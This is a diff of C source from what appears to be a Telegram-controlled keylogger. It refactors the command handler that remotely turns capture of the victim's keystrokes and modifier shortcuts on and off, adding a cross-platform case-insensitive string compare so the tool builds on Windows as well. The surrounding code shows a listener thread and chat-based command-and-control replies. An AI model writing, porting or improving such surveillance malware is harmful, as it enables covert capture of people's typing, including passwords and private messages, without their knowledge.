@@ -92,6 +92,14 @@ static pthread_t listener_thread;
 #include <strings.h>
 #endif
 
+static int c2t_strcasecmp(const char *left, const char *right) {
+#ifdef _WIN32
+  return _stricmp(left, right);
+#else
+  return strcasecmp(left, right);
+#endif
+}
+
 [[nodiscard]] static int match_command(const char *text, const char *cmd) {
   if (!text || !cmd)
     return 0;
@@ -574,22 +582,24 @@ static void handle_command(const char *text, const char *chat_id,
       if (arg && *arg) {
         while (isspace((unsigned char)*arg))
           arg++;
-        if (strcasecmp(arg, "on") == 0 || strcasecmp(arg, "1") == 0 ||
-            strcasecmp(arg, "enable") == 0 || strcasecmp(arg, "start") == 0) {
+        if (c2t_strcasecmp(arg, "on") == 0 || c2t_strcasecmp(arg, "1") == 0 ||
+            c2t_strcasecmp(arg, "enable") == 0 ||
+            c2t_strcasecmp(arg, "start") == 0) {
           keyboard_set_shortcuts_enabled(1);
           telegram_send_html(
               "⌨️ <b>Keyboard Shortcuts Capture:</b> 🟢 "
               "<b>ENABLED</b>\n<i>Modifier shortcuts ([Ctrl+C], [Alt+Tab], "
               "etc.) and special keys will now be captured.</i>");
-        } else if (strcasecmp(arg, "off") == 0 || strcasecmp(arg, "0") == 0 ||
-                   strcasecmp(arg, "disable") == 0 ||
-                   strcasecmp(arg, "stop") == 0) {
+        } else if (c2t_strcasecmp(arg, "off") == 0 ||
+                   c2t_strcasecmp(arg, "0") == 0 ||
+                   c2t_strcasecmp(arg, "disable") == 0 ||
+                   c2t_strcasecmp(arg, "stop") == 0) {
           keyboard_set_shortcuts_enabled(0);
           telegram_send_html(
               "⌨️ <b>Keyboard Shortcuts Capture:</b> ⚪ "
               "<b>DISABLED</b>\n<i>Clean typing text mode active: modifier "
               "tags and special key tags are suppressed.</i>");
-        } else if (strcasecmp(arg, "toggle") == 0) {
+        } else if (c2t_strcasecmp(arg, "toggle") == 0) {
           int s = keyboard_toggle_shortcuts();
           char resp[256];
           snprintf(resp, sizeof(resp),
